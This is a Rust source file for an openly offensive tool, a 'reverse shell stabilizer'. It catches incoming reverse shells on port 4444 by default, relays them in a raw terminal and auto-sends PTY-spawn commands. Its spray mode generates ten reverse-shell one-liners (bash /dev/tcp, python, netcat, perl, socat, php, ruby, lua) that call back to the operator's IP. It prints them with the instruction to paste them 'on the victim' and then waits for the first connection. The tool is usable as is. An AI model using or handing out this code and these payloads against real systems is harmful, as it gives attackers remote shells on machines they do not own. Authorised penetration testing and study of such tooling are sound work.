use std::env;
use std::io::{self, Read, Write};
use std::net::{SocketAddr, TcpListener, TcpStream};
use std::os::unix::io::AsRawFd;
use std::sync::atomic::{AtomicI32, Ordering};
use std::time::Duration;

const BUFSIZE: usize = 4096;

struct Terminal {
    orig: libc::termios,
}

impl Terminal {
    fn new() -> io::Result<Self> {
        let mut orig: libc::termios = unsafe { std::mem::zeroed() };
        if unsafe { libc::tcgetattr(libc::STDIN_FILENO, &mut orig) } != 0 {
            return Err(io::Error::last_os_error());
        }
        Ok(Terminal { orig })
    }

    fn set_raw(&self) -> io::Result<()> {
        let mut raw = self.orig;
        unsafe { libc::cfmakeraw(&mut raw) }
        if unsafe { libc::tcsetattr(libc::STDIN_FILENO, libc::TCSANOW, &raw) } != 0 {
            return Err(io::Error::last_os_error());
        }
        Ok(())
    }

    fn restore(&self) {
        unsafe { libc::tcsetattr(libc::STDIN_FILENO, libc::TCSANOW, &self.orig); }
    }
}

fn window_size() -> (u16, u16) {
    let mut ws: libc::winsize = unsafe { std::mem::zeroed() };
    if unsafe { libc::ioctl(libc::STDIN_FILENO, libc::TIOCGWINSZ, &mut ws) } == 0 {
        (ws.ws_row, ws.ws_col)
    } else {
        (0, 0)
    }
}

fn is_tty() -> bool {
    unsafe { libc::isatty(libc::STDIN_FILENO) != 0 }
}

static SIG_WRITE_FD: AtomicI32 = AtomicI32::new(-1);

extern "C" fn sigwinch_handler(_: i32) {
    let fd = SIG_WRITE_FD.load(Ordering::Relaxed);
    if fd >= 0 {
        let byte: u8 = 1;
        unsafe { libc::write(fd, &byte as *const _ as *const _, 1); }
    }
}

fn make_signal_pipe() -> io::Result<(i32, i32)> {
    let mut fds: [i32; 2] = [-1, -1];
    if unsafe { libc::pipe(fds.as_mut_ptr()) } != 0 {
        return Err(io::Error::last_os_error());
    }
    SIG_WRITE_FD.store(fds[1], Ordering::Relaxed);
    unsafe {
        let mut sa: libc::sigaction = std::mem::zeroed();
        sa.sa_sigaction = sigwinch_handler as *const () as libc::sighandler_t;
        libc::sigaction(libc::SIGWINCH, &sa, std::ptr::null_mut());
    }
    Ok((fds[0], fds[1]))
}

fn relay(sock: &mut TcpStream, sig_read: i32) -> io::Result<()> {
    let sock_fd = sock.as_raw_fd();
    let mut buf = [0u8; BUFSIZE];

    loop {
        let mut pfds = vec![
            libc::pollfd { fd: libc::STDIN_FILENO, events: libc::POLLIN, revents: 0 },
            libc::pollfd { fd: sock_fd, events: libc::POLLIN, revents: 0 },
            libc::pollfd { fd: sig_read, events: libc::POLLIN, revents: 0 },
        ];

        let n = unsafe { libc::poll(pfds.as_mut_ptr(), pfds.len() as _, -1) };
        if n <= 0 { break; }

        for pfd in &pfds {
            if pfd.revents & libc::POLLIN == 0 { continue; }
            if pfd.fd == libc::STDIN_FILENO {
                let n = unsafe { libc::read(libc::STDIN_FILENO, buf.as_mut_ptr() as *mut _, BUFSIZE) };
                if n <= 0 { return Ok(()); }
                sock.write_all(&buf[..n as usize])?;
            } else if pfd.fd == sock_fd {
                let n = sock.read(&mut buf)?;
                if n == 0 { return Ok(()); }
                unsafe { libc::write(libc::STDOUT_FILENO, buf.as_ptr() as *const _, n); }
            } else if pfd.fd == sig_read {
                unsafe { libc::read(sig_read, buf.as_mut_ptr() as *mut _, BUFSIZE); }
                let (rows, cols) = window_size();
                if rows > 0 {
                    let msg = format!("\r\n\x1b[?25l\x1b[1;32m[!]\x1b[0m resize: {}x{} — run 'stty rows {} cols {}' on victim\r\n",
                        rows, cols, rows, cols);
                    unsafe { libc::write(libc::STDOUT_FILENO, msg.as_ptr() as *const _, msg.len()); }
                }
            }
        }
    }
    Ok(())
}

fn stabilize_shell(sock: &mut TcpStream) -> io::Result<()> {
    let (rows, cols) = window_size();

    let cmds: Vec<&[u8]> = vec![
        b"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n",
        b"python -c 'import pty;pty.spawn(\"/bin/bash\")'\n",
        b"script -qc /bin/bash /dev/null\n",
        b"SHELL=/bin/bash script -q /dev/null\n",
        b"export TERM=xterm-256color\n",
    ];

    let mut stty = None;
    if rows > 0 {
        stty = Some(format!("stty rows {} cols {}\n", rows, cols));
    }

    for cmd in &cmds {
        sock.write_all(cmd)?;
        std::thread::sleep(Duration::from_millis(300));
    }
    if let Some(ref s) = stty {
        sock.write_all(s.as_bytes())?;
    }
    Ok(())
}

fn handle_connection(sock: &mut TcpStream, autoexec: bool, sig_read: i32) -> io::Result<()> {
    if autoexec {
        let _ = stabilize_shell(sock);
    }
    if !is_tty() {
        eprintln!("[!] stdin is not a TTY — relaying without terminal manipulation");
        return relay(sock, sig_read);
    }
    let term = Terminal::new()?;
    term.set_raw()?;
    let r = relay(sock, sig_read);
    term.restore();
    r
}

fn run_listener(port: u16, autoexec: bool, sig_read: i32) -> io::Result<()> {
    let addr = format!("0.0.0.0:{}", port);
    let listener = TcpListener::bind(&addr)
        .map_err(|e| io::Error::new(io::ErrorKind::AddrInUse, e))?;
    eprintln!("[*] Listening on tcp://{}", addr);

    loop {
        let (mut sock, peer) = listener.accept()?;
        eprintln!("[+] Connection from {}", peer);
        let r = handle_connection(&mut sock, autoexec, sig_read);
        if let Err(e) = r {
            eprintln!("\r\n[-] Error: {}", e);
        }
        eprintln!("\r\n[*] Closed: {}", peer);
    }
}

fn run_connect(host: &str, port: u16, sig_read: i32) -> io::Result<()> {
    let addr = format!("{}:{}", host, port);
    eprintln!("[*] Connecting to {}", addr);
    let mut sock = TcpStream::connect(&addr)
        .map_err(|e| io::Error::new(io::ErrorKind::ConnectionRefused, e))?;
    eprintln!("[+] Connected to {}", addr);
    let result = handle_connection(&mut sock, false, sig_read);
    eprintln!("[*] Disconnected");
    result
}

// -----------------------------------------------------------------------
// Spray mode: open multiple ports, print one-liners, catch first callback
// -----------------------------------------------------------------------
fn generate_spray_payloads(ip: &str, base: u16) -> Vec<(u16, &'static str, String)> {
    vec![
        (base,     "bash /dev/tcp", format!("bash -i >& /dev/tcp/{ip}/{base} 0>&1")),
        (base + 1, "python3",       format!("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'", base + 1)),
        (base + 2, "python2",       format!("python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'", base + 2)),
        (base + 3, "nc mkfifo",     format!("rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc {ip} {} >/tmp/f", base + 3)),
        (base + 4, "nc -e",         format!("nc -e /bin/bash {ip} {}", base + 4)),
        (base + 5, "perl",          format!("perl -e 'use Socket;$i=\"{ip}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}}'", base + 5)),
        (base + 6, "socat",         format!("socat tcp:{ip}:{} exec:bash,pty,stderr,setsid", base + 6)),
        (base + 7, "php",           format!("php -r '$sock=fsockopen(\"{ip}\",{});exec(\"/bin/bash -i <&3 >&3 2>&3\");'", base + 7)),
        (base + 8, "ruby",          format!("ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ip}\",{});loop{{c.gets.chomp!;break if $_==\"exit\";IO.popen($_,\"r\"){{|io|c.print io.read}}rescue nil}}'", base + 8)),
        (base + 9, "lua",           format!("lua5.1 -e 'local s=require\"socket\";local t=s.tcp();t:connect(\"{ip}\",{});while true do local r,x=t:receive();local f=io.popen(r,\"r\");local s=f:read(\"*a\");t:send(s);f:close();end'", base + 9)),
    ]
}

fn run_spray(ip: &str, base_port: u16, sig_read: i32) -> io::Result<()> {
    let payloads = generate_spray_payloads(ip, base_port);
    let mut listeners: Vec<(u16, TcpListener)> = Vec::new();
    let mut poll_fds: Vec<libc::pollfd> = Vec::new();

    // open all listener ports
    for &(port, _, _) in &payloads {
        let addr: SocketAddr = format!("0.0.0.0:{}", port).parse().unwrap();
        match TcpListener::bind(addr) {
            Ok(l) => {
                let fd = l.as_raw_fd();
                poll_fds.push(libc::pollfd { fd, events: libc::POLLIN, revents: 0 });
                listeners.push((port, l));
            }
            Err(e) => {
                eprintln!("  [!] cannot bind port {}: {}", port, e);
            }
        }
    }

    if listeners.is_empty() {
        eprintln!("[-] no ports could be bound");
        return Ok(());
    }

    let listening_ports: Vec<String> = listeners.iter().map(|(p, _)| p.to_string()).collect();
    eprintln!();
    eprintln!("================================================================");
    eprintln!("  Spray mode — listening on ports {}", listening_ports.join(", "));
    eprintln!("  Target IP for payloads: {}", ip);
    eprintln!("================================================================");
    eprintln!();
    eprintln!("  Copy and paste these on the victim, one at a time:");
    eprintln!();

    for (port, label, one_liner) in &payloads {
        let ok = listeners.iter().any(|(p, _)| *p == *port);
        let prefix = if ok { " " } else { "!" };
        let marker = if ok { "✓" } else { "✗" };
        eprintln!("  {}{} [port {}] {}", prefix, marker, port, label);
        eprintln!("   {}", one_liner);
        eprintln!();
    }

    eprintln!("  Waiting for a connection on any port…");
    eprintln!("================================================================");
    eprintln!();

    poll_fds.push(libc::pollfd { fd: sig_read, events: libc::POLLIN, revents: 0 });

    loop {
        let n = unsafe { libc::poll(poll_fds.as_mut_ptr(), poll_fds.len() as _, 3000) };
        if n < 0 { break; }

        // handle signal pipe
        let last = poll_fds.len() - 1;
        if poll_fds[last].revents & libc::POLLIN != 0 {
            let mut buf = [0u8; 64];
            unsafe { libc::read(poll_fds[last].fd, buf.as_mut_ptr() as *mut _, 64); }
            // ignore — just a wakeup
        }

        // check every listener
        for i in 0..listeners.len() {
            if poll_fds[i].revents & libc::POLLIN == 0 { continue; }
            match listeners[i].1.accept() {
                Ok((mut sock, peer)) => {
                    let port = listeners[i].0;
                    eprintln!();
                    eprintln!("[+] >>> CONNECTION on port {} from {} <<<", port, peer);

                    for (p, label, _) in &payloads {
                        if *p == port {
                            eprintln!("[+] Payload matched: {} (port {})", label, port);
                            break;
                        }
                    }

                    // close all other listeners, auto-stabilize
                    drop(listeners);
                    return handle_connection(&mut sock, true, sig_read);
                }
                Err(e) => {
                    eprintln!("[-] accept error on port {}: {}", listeners[i].0, e);
                }
            }
        }
    }

    eprintln!("[-] Timed out waiting for connection");
    Ok(())
}

fn print_usage(name: &str) {
    eprintln!(
"Reverse shell stabilizer — raw TTY relay with resize detection and spray.

USAGE
  {name} [port]                    listen for reverse shell (default port: 4444)
  {name} <host> <port>             connect to bind shell
  {name} --autoexec [port]         listen + auto-send python3 PTY spawn
  {name} --spray <ip> [base]       spray payloads, catch first callback
  {name} --help

SPRAY MODE
  Opens 10 ports (base .. base+9), generates one-liners for each
  technique (bash_tcp, python3, python2, nc, perl, socat, php,
  ruby, lua), prints them, and waits.  Whichever connects first
  enters the stabilizer relay.  Useful when you don't know what's
  available on the victim.", name = name);
}

fn main() -> io::Result<()> {
    let (sig_read, sig_write) = make_signal_pipe()?;

    let name = env::args().next().unwrap_or_else(|| "./rsh-stab".into());
    let args: Vec<String> = env::args().skip(1).collect();

    let result = match args.first().map(|s| s.as_str()) {
        Some("--spray") | Some("-s") if args.len() >= 2 => {
            let ip = &args[1];
            let base: u16 = args.get(2).and_then(|s| s.parse().ok()).unwrap_or(4444);
            run_spray(ip, base, sig_read)
        }
        Some("--connect") | Some("-c") if args.len() >= 3 => {
            run_connect(&args[1], args[2].parse().unwrap_or(4444), sig_read)
        }
        Some("--autoexec") | Some("-a") => {
            let port: u16 = args.get(1).and_then(|s| s.parse().ok()).unwrap_or(4444);
            run_listener(port, true, sig_read)
        }
        Some("--help") | Some("-h") => {
            print_usage(&name);
            Ok(())
        }
        _ => match args.len() {
            0 => run_listener(4444, false, sig_read),
            1 => {
                let port: u16 = args[0].parse().unwrap_or(4444);
                run_listener(port, false, sig_read)
            }
            2 => run_connect(&args[0], args[1].parse().unwrap_or(4444), sig_read),
            _ => {
                print_usage(&name);
                Ok(())
            }
        },
    };

    unsafe { libc::close(sig_read); libc::close(sig_write); }
    result
}
